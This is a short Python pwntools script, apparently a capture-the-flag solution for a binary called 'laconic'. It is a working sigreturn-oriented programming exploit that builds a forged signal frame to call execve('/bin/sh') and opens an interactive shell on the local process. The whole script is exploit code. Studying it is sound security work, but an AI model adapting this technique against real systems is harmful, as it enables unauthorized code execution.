#!/usr/bin/env python

from pwn import *
context.arch = 'amd64'

# cause strings ./dist/laconic show that program have /bin/sh already
# pwndbg> search /bin/sh
# Searching for byte: b'/bin/sh'
# laconic         0x43238 0x68732f6e69622f /* '/bin/sh' */
binsh_addr = 0x43238
# SROP Frame
frame = SigreturnFrame()
frame.rax = 0x3b                          # execve syscall number
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = 0x43015                       # syscall

payload = b'A' * 8 # padding for rsp - 8
payload += p64(0x43018)
payload += p64(0xf)                # sigreturn syscall number
payload += p64(0x43015)
payload += bytes(frame)

if args.GDB:
    io = gdb.debug('./dist/laconic', '''
    b *0x43017
    c
    ''')
else:
    io = process('./dist/laconic')
_ = io.sendline(payload)

io.interactive()
